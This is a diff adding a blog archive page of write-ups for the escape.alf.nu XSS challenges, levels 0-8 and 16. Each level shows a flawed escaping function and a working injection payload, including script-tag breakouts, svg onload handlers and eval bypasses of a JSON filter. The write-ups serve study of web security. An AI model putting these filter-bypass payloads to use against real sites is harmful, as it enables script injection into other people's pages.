+<li>junk_regexp: script&gt;&lt;script&gt;console.log(")</li>
+</ul>
+
+<p>Actually you can see in the console that the first console.log writes '&lt;!--&lt;script&gt;'</p>
+
+<p>In order to make it even shorter we can replace "//" with unicode \u2028 as suggested by <a href="https://twitter.com/0x6D6172696F">Mario</a></p>
+
+<h1 id="level16">Level 16:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(text) {  
+  // *cough* not done
+
+  var i = 0;
+  window.the_easy_but_expensive_way_out = function() { alert(i++) };
+
+// "A JSON text can be safely passed into JavaScript's eval() function
+// (which compiles and executes a string) if all the characters not
+// enclosed in strings are in the set of characters that form JSON
+// tokens."
+
+  if (!(/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/.test(
+          text.replace(/"(\\.|[^"\\])*"/g, '')))) {
+    try {
+      var val = eval('(' + text + ')');
+      console.log('' + val);
+    } catch (_) {
+      console.log('Crashed: '+_);
+    }
+  } else {
+    console.log('Rejected.');
+  }
+}
+</code></pre>
+
+<p>This level is based on a real world filter described by <a href="https://twitter.com/WisecWisec">Stefano Di Paola</a> in this <a href="http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html">post</a></p>
+
+<p>If we study the regexp carefully we will see that the letter "s" is allowed since its within the "u-r" interval, that allows us to use the word "self" and with that we can craft a valid JSON payload. <br>
+The trick is that we will be adding "0" to our object so the JS engine will need to calculate the valueOf our object. So if we define the "valueOf" function as the "the<em>easy</em>but<em>expensive</em>way_out" global function, we will be able to invoke it during the arithmetic operation. <br>
+The problem is that it will alert "0" since "i" its initialized with "0", but we can do it twice to alert a "1".</p>
+
+<p>Long Solution:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">{"valueOf":self["the_easy_but_expensive_way_out"]}+0,{"valueOf":self["the_easy_but_expensive_way_out"]}
+</code></pre>
+
+<p>That is a nice trick to execute a function when parenthesis are not allowed. But there some more like <a href="https://twitter.com/garethheyes">Gareth</a> famous one:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">onerror=eval;throw['=1;alert\x281\x29']  
+</code></pre>
+
+<p>You can get a shorter solution for IE only as explained by <a href="https://twitter.com/WisecWisec">Stefano Di Paola</a> in his <a href="http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html">post</a></p>
+
+<pre><code class="language-lang-javascript line-numbers ">{"valueOf":self["location"],"toString":[]["join"],0:"javascript:alert(1)","length":1}
+</code></pre>
+
+<p>And thats all folks, thanks for reading!</p>
+    </section>
+</article>
+
+
+<article class="post tag-xss tag-javascript">
+    <header class="post-header">
+        <span class="post-meta"><time datetime="2014-01-06">06 Jan 2014</time> on <a href="../xss/">XSS</a>, <a href="index.html">JavaScript</a></span>
+        <h2 class="post-title"><a href="../../blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/">escape.alf.nu XSS Challenges Write-ups (Part 1)</a></h2>
+
+    </header>
+    <section class="post-content">
+        <p>These are my solutions to <a href="https://twitter.com/steike">Erling Ellingsen</a> <a href="http://escape.alf.nu">escape.alf.nu XSS challenges</a>. I found them very interesting and I learnt a lot from them (especially from the last ones to be published in Part 2). Im publishing my results since the game has been online for a long time now and there are already some sites with partial results.</p>
+
+<p>My suggestion, if you havent done it so far, is to go and try to solve them by yourselves.... so come on, dont be lazy, stop reading here and give them a try ...</p>
+
+<p>...</p>
+
+<p>...</p>
+
+<p>...</p>
+
+<p>...</p>
+
+<p>Ok so if you have already solve them or need some hits, here are my solutions</p>
+
+<h1 id="level0">Level 0:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  // Warmup.
+
+  return '&lt;script&gt;console.log("'+s+'");&lt;/script&gt;';
+}
+</code></pre>
+
+<p>There is no encoding so the easiest solution is to close "log" call and inject our "alert"</p>
+
+<p>Solution:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">");alert(1,"
+</code></pre>
+
+<h1 id="level1">Level 1:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  // Escaping scheme courtesy of Adobe Systems, Inc.
+  s = s.replace(/"/g, '\\"');
+  return '&lt;script&gt;console.log("' + s + '");&lt;/script&gt;';
+}
+</code></pre>
+
+<p>Function is escaping double quotes by adding two slashes. Shortest solution is to inject <strong>\"</strong> so the escape function turns it into</p>
+
+<pre><code class="language-lang-javascript line-numbers ">\\\"
+</code></pre>
+
+<p>Effectively escaping the backslash but not the double quotes.</p>
+
+<p>Solution:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">\");alert(1)//
+</code></pre>
+
+<h1 id="level2">Level 2:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  s = JSON.stringify(s);
+  return '&lt;script&gt;console.log(' + s + ');&lt;/script&gt;';
+}
+</code></pre>
+
+<p>JSON.stringify() will escape double quotes (") into  (\") but it does not escaps angle brackets (&lt;&gt;), so we can close the current script block and start a brand new one.</p>
+
+<p>Solution:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;/script&gt;&lt;script&gt;alert(1)//  
+</code></pre>
+
+<h1 id="level3">Level 3:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
+  console.log(url);
+
+  var a = document.createElement('a');
+  a.href = url;
+  document.body.appendChild(a);
+  a.click();
+}
+</code></pre>
+
+<p>Again (") is escaped but since we are within a URL context we can use URL encoding. In this case %22 for (")</p>
+
+<p>Solution:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">%22);alert(1)//
+</code></pre>
+
+<h1 id="level4">Level 4:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  var text = s.replace(/&lt;/g, '&amp;lt;').replace('"', '&amp;quot;');
+  // URLs
+  text = text.replace(/(http:\/\/\S+)/g, '&lt;a href="$1"&gt;$1&lt;/a&gt;');
+  // [[img123|Description]]
+  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '&lt;img alt="$2" src="$1.gif"&gt;');
+  return text;
+}
+</code></pre>
+
+<p>The following characters are replaced:</p>
+
+<ul>
+<li>&lt; → &amp;lt; (all ocurrences)</li>
+<li>" → &amp;quot; (just the first occurrence)</li>
+</ul>
+
+<p>The escape function also use a template like [[src|alt]] that becomes</p>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;img alt="alt" src="src.gif"&gt;  
+</code></pre>
+
+<p>We can use this template with any <strong>src</strong> and an <strong>alt</strong> starting with a double quote (") that will be escaped, a second double quote (") that won't be escaped and then a new event handler like <strong>onload="alert(1)</strong> that will be closed by the double quote inserted by the template.</p>
+
+<p>Solution:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">[[a|""onload="alert(1)]]
+</code></pre>
+
+<p>It will be rendered as:</p>
+
+<p><img src="../../content/images/octopress/xsslevel04.png" alt=""></p>
+
+<h1 id="level5">Level 5:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  // Level 4 had a typo, thanks Alok.
+  // If your solution for 4 still works here, you can go back and get more points on level 4 now.
+
+  var text = s.replace(/&lt;/g, '&amp;lt;').replace(/"/g, '&amp;quot;');
+  // URLs
+  text = text.replace(/(http:\/\/\S+)/g, '&lt;a href="$1"&gt;$1&lt;/a&gt;');
+  // [[img123|Description]]
+  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '&lt;img alt="$2" src="$1.gif"&gt;');
+  return text;
+}
+</code></pre>
+
+<p>Now we cannot rely on the (<strong>"</strong>) regexp typo but we can still use the template function to generate an image tag executing our <strong>alert(1)</strong> when loaded. We will use any <strong>src</strong> and a URL that will be replaced by the second replace function.</p>
+
+<p>Solution:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">[[a|http://onload='alert(1)']]
+</code></pre>
+
+<ul>
+<li>The first replace function wont trigger with this payload</li>
+<li>The second replace function will act on the URL getting:</li>
+</ul>
+
+<pre><code class="language-lang-javascript line-numbers ">[[a|&lt;a href="http://onload='alert(1)']]"&gt;http://onload='alert(1)']]&lt;/a&gt;
+</code></pre>
+
+<ul>
+<li>The third replace function will create our <strong>img</strong> tag</li>
+</ul>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;img alt="&lt;a href="http://onload='alert(1)']]"&gt;http://onload='alert(1)'" src="a.gif"&gt;  
+</code></pre>
+
+<p>It will be rendered as:</p>
+
+<p><img src="../../content/images/octopress/xsslevel05.png" alt=""></p>
+
+<h1 id="level6">Level 6:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  // Slightly too lazy to make two input fields.
+  // Pass in something like "TextNode#foo"
+  var m = s.split(/#/);
+
+  // Only slightly contrived at this point.
+  var a = document.createElement('div');
+  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
+  return a.innerHTML;
+}
+</code></pre>
+
+<p>The trick is to review all the functions in the DOM that begin with "create" and that dont escape characters. The shortest one is to use "createComment". For example <strong>Comment#&lt;foo&gt;</strong> will create the following code:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;!--&lt;foo&gt;--&gt;  
+</code></pre>
+
+<p>From there, its easy to go to:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">Comment#&gt;&lt;svg onload=alert(1)  
+</code></pre>
+
+<p>That will render:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;!--&gt;&lt;svg onload=alert(1)--&gt;  
+</code></pre>
+
+<h1 id="level7">Level 7:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  // Pass inn "callback#userdata"
+  var thing = s.split(/#/);
+
+  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
+  var obj = {'userdata': thing[1] };
+  var json = JSON.stringify(obj).replace(/&lt;/g, '\\u003c');
+  return "&lt;script&gt;" + thing[0] + "(" + json +")&lt;/script&gt;";
+}
+</code></pre>
+
+<p>We will enclose the opening bracket and the json fixed contents with single quotes to transform it into a string and then we will be able to inject our js payload:</p>
+
+<p>Solution:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">'#';alert(1)//  
+</code></pre>
+
+<p>It will render:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;script&gt;'({"userdata":"';alert(1)//"})&lt;/script&gt;  
+</code></pre>
+
+<h1 id="level8">Level 8:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  // Courtesy of Skandiabanken
+  return '&lt;script&gt;console.log("' + s.toUpperCase() + '")&lt;/script&gt;';
+}
+</code></pre>
+
+<p>There is no escaping function, only an upper case, so we can close the exisiting <strong>&lt;script&gt;</strong> tag and create a new tag (case insensitive) with an <strong>onload</strong> script using no alpha characters:</p>
+
+<p>These are some valid solutions:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;/script&gt;&lt;svg&gt;&lt;script&gt;&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74(1)//   (52)  
+&lt;/script&gt;&lt;svg onload=&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74(1)//   (51)  
+&lt;/script&gt;&lt;svg onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)//   (50)  
+</code></pre>
+
+<p>I guess people solving the challange with 28 characters or so did something like:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;/script&gt;&lt;script src="&lt;very short domain&gt;"&gt;  
+</code></pre>
+    </section>
+</article>
+
+
+<nav class="pagination" role="navigation">
+    <span class="page-number">Page 1 of 1</span>
+</nav>
+
+    </main>
+
+    <!-- You can safely delete this line if your theme does not require jQuery -->
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+
+    <script src="../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
+    <script data-no-instant>InstantClick.init();</script>
+    <script data-no-instant>
+        InstantClick.on('change', function() {
+            prism_markdown();
+            Prism.highlightAll();
+        });
+        InstantClick.init();
+    </script>
+
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function () {
+            var s = document.createElement('script'); s.async = true;
+            s.type = 'text/javascript';
+            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+        }());
+    </script>
+
+    <script type="text/javascript" src="../../assets/js/prism-loader.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../assets/js/prism.js?v=d47df0f104"></script>
+
+</body>
+
